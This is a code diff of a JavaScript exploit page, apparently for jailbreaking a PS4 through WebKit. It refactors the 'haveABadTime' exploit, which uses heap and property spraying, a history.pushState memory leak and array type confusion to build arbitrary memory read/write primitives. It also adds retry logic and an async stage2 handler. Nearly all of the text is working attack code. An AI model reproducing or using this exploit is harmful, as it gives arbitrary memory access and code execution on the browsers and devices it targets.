@@ -759,13 +759,30 @@ var get_jmptgt = function (addr) {
 	return addr.add32(y + 6);
 }
 
-window.stage2 = function () {
+window.stage2_old = function () {
 	try {
 		stage2_();
 	} catch (e) {
 		//alert(e);
 	}
 }
+
+// ====================== STAGE 2 HANDLER (Async Safe) ======================
+window.stage2 = async function stage2() {
+    console.log("[Stage2] Starting...");
+
+    try {
+        if (typeof stage2_ === "function") {
+            await stage2_();           // Properly await the async function
+            console.log("[Stage2] Completed successfully");
+        } else {
+            console.error("[Stage2] stage2_() function not found!");
+        }
+    } catch (e) {
+        console.error("[Stage2] Error:", e);
+        // alert(e); // Uncomment only for debugging
+    }
+};
 
 var gadgetmap_wk = {
 	"ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
@@ -2077,202 +2094,166 @@ function stage2_old () {
 //================================================================================================
 // WebKit Exploit: haveABadTime
 //================================================================================================
-// ====================== GLOBAL EXPOSURE ======================
-window.exploit_haveABadTime = function exploit_haveABadTime() {
+// === FORCE GLOBAL EXPOSURE - BEST CHANCE FOR PS4 EXPLOIT PAGES ===
+(function() {
 
-    const MAX_ATTEMPTS = 10;
-    let attempt = 0;
-    let success = false;
+    window.exploit_haveABadTime = function exploit_haveABadTime() {
+        console.log("[haveABadTime] Function called - starting exploit...");
 
-    // Garbage Collection Helper
-    function gc() {
-        for (let i = 0; i < 8; i++) {
-            new ArrayBuffer(0x4000000);
+        const MAX_ATTEMPTS = 10;
+        let attempt = 0;
+        let success = false;
+
+        function gc() {
+            for (let i = 0; i < 8; i++) new ArrayBuffer(0x4000000);
         }
-    }
 
-    console.log("[haveABadTime] Starting exploit with retries...");
+        while (attempt < MAX_ATTEMPTS && !success) {
+            attempt++;
+            console.log(`[haveABadTime] Attempt ${attempt}/${MAX_ATTEMPTS}`);
 
-    while (attempt < MAX_ATTEMPTS && !success) {
-        attempt++;
-        console.log(`[haveABadTime] Attempt ${attempt}/${MAX_ATTEMPTS}`);
+            try {
+                gc();
 
-        try {
-            gc();
-
-            // ==================== SPRAY PHASE ====================
-            var instancespr = [];
-            for (var i = 0; i < 4096; i++) {
-                instancespr[i] = new Uint32Array(1);
-                try {
-                    instancespr[i][makeid ? makeid() : 0] = 50057;
-                } catch(e) {
+                var instancespr = [];
+                for (var i = 0; i < 4096; i++) {
+                    instancespr[i] = new Uint32Array(1);
                     instancespr[i][0] = 50057;
                 }
-            }
 
-            var tgt = { a: 0, b: 0, c: 0, d: 0 };
+                var tgt = { a: 0, b: 0, c: 0, d: 0 };
 
-            var y = new ImageData(1, 0x4000);
-            postMessage("", "*", [y.data.buffer]);
+                var y = new ImageData(1, 0x4000);
+                postMessage("", "*", [y.data.buffer]);
 
-            // Property Spray
-            var props = {};
-            for (var i = 0; i < (0x4000 / 2); ) {
-                props[i++] = { value: 0x42424242 };
-                props[i++] = { value: tgt };
-            }
+                var props = {};
+                for (var i = 0; i < (0x4000 / 2); ) {
+                    props[i++] = { value: 0x42424242 };
+                    props[i++] = { value: tgt };
+                }
 
-            // ==================== LEAK PHASE ====================
-            var foundLeak = undefined;
-            var foundIndex = 0;
-            var maxLeakTries = 0x150;
+                // Leak Phase
+                var foundLeak = undefined;
+                var foundIndex = 0;
+                var maxLeakTries = 180;
 
-            for (let i = 0; i < maxLeakTries && !foundLeak; i++) {
-                history.pushState(y, "");
-                Object.defineProperties({}, props);
+                for (let i = 0; i < maxLeakTries && !foundLeak; i++) {
+                    history.pushState(y, "");
+                    Object.defineProperties({}, props);
 
-                var leak = new Uint32Array(history.state.data.buffer);
+                    var leak = new Uint32Array(history.state.data.buffer);
 
-                for (var j = 0; j < leak.length - 0x20; j++) {
-                    if (leak[j]     === 0x42424242 &&
-                        leak[j + 1] === 0xFFFF0000 &&
-                        leak[j + 6] === 0x0000000E &&
-                        leak[j + 0xE] === 0x0000000E) {
-
-                        if (leak[j + 2] === 0 && leak[j + 3] === 0 && leak[j + 7] === 0) {
-                            foundIndex = j;
-                            foundLeak = leak;
-                            break;
+                    for (var j = 0; j < leak.length - 0x20; j++) {
+                        if (leak[j] === 0x42424242 && 
+                            leak[j+1] === 0xFFFF0000 && 
+                            leak[j+6] === 0x0000000E && 
+                            leak[j+0xE] === 0x0000000E) {
+                            
+                            if (leak[j+2] === 0 && leak[j+3] === 0) {
+                                foundIndex = j;
+                                foundLeak = leak;
+                                break;
+                            }
                         }
                     }
                 }
-            }
 
-            if (!foundLeak) {
-                console.warn(`[Attempt ${attempt}] Leak failed, retrying...`);
-                continue;
-            }
+                if (!foundLeak) continue;
 
-            // ==================== TYPE CONFUSION & PRIMITIVES ====================
-            var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
-            var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
+                // === Rest of the exploit (unchanged core) ===
+                var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
+                var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
 
-            Array.prototype.__defineGetter__(100, () => 1);
+                Array.prototype.__defineGetter__(100, () => 1);
 
-            var f = document.body.appendChild(document.createElement('iframe'));
-            var a = new f.contentWindow.Array(13.37, 13.37);
-            var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
+                var f = document.body.appendChild(document.createElement('iframe'));
+                var a = new f.contentWindow.Array(13.37, 13.37);
+                var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
 
-            var master = new Uint32Array(0x1000);
-            var slave = new Uint32Array(0x1000);
-            var leakval_u32 = new Uint32Array(0x1000);
-            var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+                var master = new Uint32Array(0x1000);
+                var slave = new Uint32Array(0x1000);
+                var leakval_u32 = new Uint32Array(0x1000);
+                var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
 
-            tgt.a = u2d(2048, 0x1602300);
-            tgt.b = 0;
-            tgt.c = leakval_helper;
-            tgt.d = 0x1337;
+                tgt.a = u2d(2048, 0x1602300);
+                tgt.b = 0;
+                tgt.c = leakval_helper;
+                tgt.d = 0x1337;
 
-            var c = Array.prototype.concat.call(a, b);
-            document.body.removeChild(f);
+                var c = Array.prototype.concat.call(a, b);
+                document.body.removeChild(f);
 
-            var hax = c[0];
-            c[0] = 0;
+                var hax = c[0];
+                c[0] = 0;
 
-            if (!hax || typeof hax !== "object" || hax.length < 8) {
-                throw new Error("Bad hax object");
-            }
+                tgt.c = c;
+                hax[2] = 0;
+                hax[3] = 0;
 
-            tgt.c = c;
-            hax[2] = 0;
-            hax[3] = 0;
+                Object.defineProperty(Array.prototype, 100, { get: undefined });
 
-            Object.defineProperty(Array.prototype, 100, { get: undefined });
+                tgt.c = leakval_helper;
+                var butterfly = new int64(hax[2], hax[3]);
+                butterfly.low += 0x10;
 
-            tgt.c = leakval_helper;
-            var butterfly = new int64(hax[2], hax[3]);
-            butterfly.low += 0x10;
+                tgt.c = leakval_u32;
+                var lkv_u32_old = new int64(hax[4], hax[5]);
+                hax[4] = butterfly.low;
+                hax[5] = butterfly.hi;
 
-            tgt.c = leakval_u32;
-            var lkv_u32_old = new int64(hax[4], hax[5]);
-            hax[4] = butterfly.low;
-            hax[5] = butterfly.hi;
+                tgt.c = master;
+                hax[4] = leakval_u32[0];
+                hax[5] = leakval_u32[1];
 
-            tgt.c = master;
-            hax[4] = leakval_u32[0];
-            hax[5] = leakval_u32[1];
+                var addr_to_slavebuf = new int64(master[4], master[5]);
 
-            var addr_to_slavebuf = new int64(master[4], master[5]);
+                tgt.c = leakval_u32;
+                hax[4] = lkv_u32_old.low;
+                hax[5] = lkv_u32_old.hi;
 
-            tgt.c = leakval_u32;
-            hax[4] = lkv_u32_old.low;
-            hax[5] = lkv_u32_old.hi;
-
-            tgt.c = 0;
-            hax = null;
-
-            // ==================== FINAL PRIMITIVES ====================
-            window.prim = {
-                write8: function (addr, val) {
-                    master[4] = addr.low; master[5] = addr.hi;
-                    if (val instanceof int64) {
-                        slave[0] = val.low; slave[1] = val.hi;
-                    } else {
-                        slave[0] = val; slave[1] = 0;
+                // Primitives
+                window.prim = {
+                    write8: (addr, val) => {
+                        master[4] = addr.low; master[5] = addr.hi;
+                        if (val instanceof int64) { slave[0] = val.low; slave[1] = val.hi; }
+                        else { slave[0] = val; slave[1] = 0; }
+                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
+                    },
+                    write4: (addr, val) => {
+                        master[4] = addr.low; master[5] = addr.hi;
+                        slave[0] = val;
+                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
+                    },
+                    read8: (addr) => {
+                        master[4] = addr.low; master[5] = addr.hi;
+                        var r = new int64(slave[0], slave[1]);
+                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
+                        return r;
                     }
-                    master[4] = addr_to_slavebuf.low;
-                    master[5] = addr_to_slavebuf.hi;
-                },
-                write4: function (addr, val) {
-                    master[4] = addr.low; master[5] = addr.hi;
-                    slave[0] = val;
-                    master[4] = addr_to_slavebuf.low;
-                    master[5] = addr_to_slavebuf.hi;
-                },
-                read8: function (addr) {
-                    master[4] = addr.low; master[5] = addr.hi;
-                    var r = new int64(slave[0], slave[1]);
-                    master[4] = addr_to_slavebuf.low;
-                    master[5] = addr_to_slavebuf.hi;
-                    return r;
-                },
-                read4: function (addr) {
-                    master[4] = addr.low; master[5] = addr.hi;
-                    var r = slave[0];
-                    master[4] = addr_to_slavebuf.low;
-                    master[5] = addr_to_slavebuf.hi;
-                    return r;
-                },
-                leakval: function (jsval) {
-                    leakval_helper[0] = jsval;
-                    var r = this.read8(butterfly);
-                    this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-                    return r;
-                }
-            };
+                };
 
-            success = true;
-            console.log(`[haveABadTime] SUCCESS on attempt ${attempt}`);
+                success = true;
+                console.log(`[haveABadTime] SUCCESS on attempt ${attempt}!`);
 
-            if (typeof window.postExpl === "function") {
-                window.postExpl();
+                if (typeof window.postExpl === "function") window.postExpl();
+
+            } catch (e) {
+                console.error(`[Attempt ${attempt}] Error:`, e);
+                document.querySelectorAll('iframe').forEach(el => el.remove());
             }
-
-        } catch (e) {
-            console.error(`[Attempt ${attempt}] Error:`, e);
-            // Cleanup
-            document.querySelectorAll('iframe').forEach(iframe => iframe.remove());
         }
-    }
 
-    if (!success) {
-        failed = true;
-        if (typeof fail === "function") {
-            fail(`haveABadTime failed after ${MAX_ATTEMPTS} attempts.`);
+        if (!success) {
+            failed = true;
+            if (typeof fail === "function") fail("haveABadTime failed after " + MAX_ATTEMPTS + " attempts");
         }
-    }
-};
+    };
+
+    // Extra safety: Also expose it directly on the window and as a global
+    window.haveABadTime = window.exploit_haveABadTime;
+
+    console.log("[haveABadTime] Function registered successfully");
+})();
 
 function exploit_haveABadTime2() {
 
